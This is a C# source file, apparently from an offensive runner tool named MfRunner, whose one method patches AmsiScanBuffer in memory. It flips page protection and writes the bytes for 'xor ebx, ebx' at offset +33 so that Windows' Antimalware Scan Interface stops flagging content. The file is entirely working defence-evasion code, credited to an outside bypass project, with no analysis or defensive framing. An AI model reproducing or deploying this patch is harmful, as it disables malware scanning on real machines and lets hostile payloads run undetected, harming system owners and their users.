using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace MfRunner
{
    internal partial class Program
    {
        /// <summary>
        /// GlobalAMSIBypass implementation
        /// Patches AmsiScanBuffer at offset +33 with xor ebx, ebx instruction
        /// Credits: https://github.com/Chainski/GlobalAMSIBypass
        /// </summary>
        public static void GlobalAMSIBypass()
        {
            IntPtr AmsiScanBufferAddress = GetExportAddress(AmsiAddress, 0xDE7FB4D9); // AmsiScanBuffer
            if (AmsiScanBufferAddress == IntPtr.Zero)
                return;

            // Patch at offset +33 with xor ebx, ebx (3 bytes: 0x48 0x31 0xDB for x64)
            // This is the GlobalAMSIBypass technique from Chainski
            IntPtr patchAddress = (IntPtr)((long)AmsiScanBufferAddress + 33);
            byte[] patchBytes = new byte[] { 0x48, 0x31, 0xDB }; // xor ebx, ebx (x64)

            uint OldProtect = 0;
            if (CustomVirtualProtect(patchAddress, (UIntPtr)patchBytes.Length, 0x40, out OldProtect))
            {
                CopyFunction(patchAddress, patchBytes);
                // Restore original protection
                CustomVirtualProtect(patchAddress, (UIntPtr)patchBytes.Length, 0x20, out OldProtect);
            }
        }
    }
}
